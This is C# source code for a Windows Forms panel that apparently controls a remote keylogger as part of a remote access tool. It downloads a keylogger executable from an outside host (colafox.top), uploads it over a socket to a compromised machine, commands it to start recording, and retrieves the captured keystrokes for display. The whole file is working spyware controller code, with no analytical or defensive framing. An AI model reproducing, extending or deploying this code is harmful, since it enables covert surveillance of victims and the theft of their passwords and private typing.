using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class KeyboardLog : Form
    {

        public Socket socks;
        public string raddr;

        public KeyboardLog()
        {
            InitializeComponent();
        }

        public void getkeyexe()
        {
            label4.Text = "正在下载键盘记录组件";
            try
            {
                var url = "https://colafox.top/k.html";
                var save = @"keylog.exe";
                if (!File.Exists(save))
                {
                    label4.Text = ("文件不存在，开始下载...");
                    using (var web = new WebClient())
                    {
                        web.DownloadFile(url, save);
                    }
                    label4.Text =("文件下载成功");
                }
                label4.Text = ("文件存在");
            }
            catch
            {
                label4.Text = ("下载失败！ 重新下载");
                getkeyexe();
            }
            label4.Text = "下载完成！";
            button1.Enabled = true;
            button2.Enabled = true;
            label4.Text = "数值对照:\n访问spy.colafox.top\n获取完整使用文档\n不支持Win2000及以下";
        }
        public void KeyboardLog_Load(object sender, EventArgs e)
        {
            label3.Text = raddr;
            button1.Enabled = false;
            button2.Enabled = false;
            Thread th = new Thread(getkeyexe);
            th.Start();
        }

        public void ssrecorad()
        {
            button1.Enabled = false;
            try
            {
                socks.Send(Encoding.UTF8.GetBytes("KU"));
                button1.Text = "键盘监控开始";
            }
            catch (Exception e)
            {
                label4.Text = e.ToString();
            }
            button1.Enabled = true;
        }
        public void gottedmsg()
        {
            button2.Enabled = false;
            try
            {
                button2.Text = "正在获取结果";
                socks.Send(Encoding.UTF8.GetBytes("KD"));

                FileStream wrtr = new FileStream("out.txt", FileMode.Create);
                byte[] data = new byte[256];
                while (true)
                {
                    try
                    {
                        Array.Clear(data, 0, data.Length);
                        socks.Receive(data);
                        if (Encoding.UTF8.GetString(data).IndexOf("<EOF>") > -1)
                        {
                            wrtr.Write(data, 0, data.Length);
                            break;
                        }
                        wrtr.Write(data, 0, data.Length);
                    }
                    catch (Exception es)
                    {
                        label4.Text = (es.ToString());
                    }
                }

                wrtr.Flush();
                wrtr.Close();

                string log = File.ReadAllText(@"out.txt");
                log = log.Replace(" ", "");
                log = log.Replace("<EOF>", "");
                richTextBox1.Text = log;
                button2.Text = "关闭键盘监听";
                button1.Text = "开始键盘监听";

            }
            catch(Exception es)
            {
                label4.Text = es.ToString();
            }
            button2.Enabled = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(ssrecorad);
            thread.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(gottedmsg);
            thread.Start();
		}

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            socks.Send(Encoding.UTF8.GetBytes("KF"));

            FileStream fs = new FileStream(@"keylog.exe", FileMode.Open);
            long contentLength = fs.Length;
            socks.Send(BitConverter.GetBytes(contentLength));
            while (true)
            {           
                byte[] bits = new byte[128];
                int r = fs.Read(bits, 0, bits.Length);
                if (r <= 0) break;
                socks.Send(bits, r, SocketFlags.None);
            }
            fs.Position = 0;

            fs.Close();
            button3.Text = "已发送";
            Thread.Sleep(2000);
            button1.Enabled = true;
            button2.Enabled = true;
        }
    }
}
